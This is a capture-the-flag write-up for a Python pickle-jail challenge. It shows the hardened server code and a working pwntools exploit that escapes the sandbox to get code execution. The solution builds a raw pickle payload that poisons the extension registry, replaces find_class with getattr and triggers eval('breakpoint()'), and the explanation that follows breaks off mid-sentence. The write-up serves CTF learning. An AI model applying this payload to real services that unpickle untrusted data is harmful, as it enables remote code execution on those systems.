# You shall not call Revenge

## challenge

Never have I seen a pickle, worming its way out of a jail, whose exploitation did not rely upon the calling of some nefarious function. Thus, I hereby declare: there shall be no call heeded within this domain anymore. It is for I yearn the secure confinement of pickles; and shall not stand their escape.

The server isn't changed, but you must get RCE to read flag this time.

server.py
```py
#!/usr/bin/env python3

import __main__
import pickle
import io

# Security measure -- forbid calls
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']: #pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:
    id = getattr(pickle, op.upper())[0]
    delattr(pickle._Unpickler, pickle._Unpickler.dispatch[id].__name__)
    pickle._Unpickler.dispatch[id] = lambda _: print("Stop right there, you heineous criminal!") or exit()

# Security measure -- remove dangerous class and method
del pickle.Unpickler
del pickle._Unpickler.find_class

# Security measure -- overload unpickler with an actually secure class
class SecureUnpickler(pickle._Unpickler):
    def find_class(self, _: str, name: str) -> object:
        # Security measure -- prevent access to dangerous elements
        for x in ['exe', 'os', 'break', 'set', 'eva', 'help', 'sys', 'load', 'open', 'dis']:
            if x in name:
                print("Smuggling contraband in broad daylight?! Guards!")
                break
        # Security measure -- only the main module is a valid lookup target
        else:
            return getattr(__main__, name)

# Security measure -- remove dangerous magic
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]

# Security measure -- remove dangerous magic
__builtins__ = { k: getattr(__builtins__, k) for k in dir(__builtins__) if '_' not in k }

# My jail is very secure!
data = io.BytesIO(bytes.fromhex(input('$ ')))
SecureUnpickler(data).load()
```

there is also a readflag binary in some directory idk where but it is just to check that rce has been achieved

## solution

```py
from pwn import *
from pickle import *

# for k in __main__.__builtins__:
#     setattr(__main__.__main__, k, __main__.__builtins__[v])
p = GLOBAL + b'__main__\n__main__\n' + PUT + b'1\n' + NONE + GLOBAL + b'__main__\n__builtins__\n' + TUPLE2 + BUILD

# 
p += GLOBAL + b'__main__\nSecureUnpickler\n' + PUT + b'2\n'
p += GLOBAL + b'__main__\ngetattr\n' + PUT + b'3\n'
p += GLOBAL + b'__main__\npickle\n' + NONE + MARK + UNICODE + b'_inverted_registry\n' + MARK + INT + b'0\n' + MARK + GET + b'1\n' + UNICODE \
        + b'eval\n' + LIST + INT + b'1\n' + MARK + UNICODE + b'breakpoint()\n' + LIST + DICT + DICT + TUPLE2 + BUILD
p += GET + b'2\n' + NONE + MARK + UNICODE + b'find_class\n' + GET + b'3\n' + DICT + TUPLE2 + BUILD
p += EXT1 + b'\x00' + PUT + b'4\n'
p += GET + b'2\n' + NONE + MARK + UNICODE + b'find_class\n' + GET + b'4\n' + DICT + TUPLE2 + BUILD + POP
p += EXT1 + b'\x01' + STOP

# 1 is main module
# 2 is SecureUnpickler
# 3 is getattr

# build __main__.__builtins__ onto __main__.__main__
# build onto inverted registry the dict {0: [__main__.__main__, 'eval'], 1: 'breakpoint()'}
# __main__.SecureUnpickler.find_class = getattr
# use ext opcode
# win

io = process(['python3', 'chall.py'])
io.sendline(p.hex().encode())
io.interactive()
```

this one was enjoyable

the way that this worked was that we could first do a standard module-submodule builtins grab by using the `GLOBAL` opcode to do `getattr(__main__, "__main__")` and then 
also `getattr(__main__, "__builtins__")` and then building the dict (build opcode has almost arbitrary setattr)

then, 
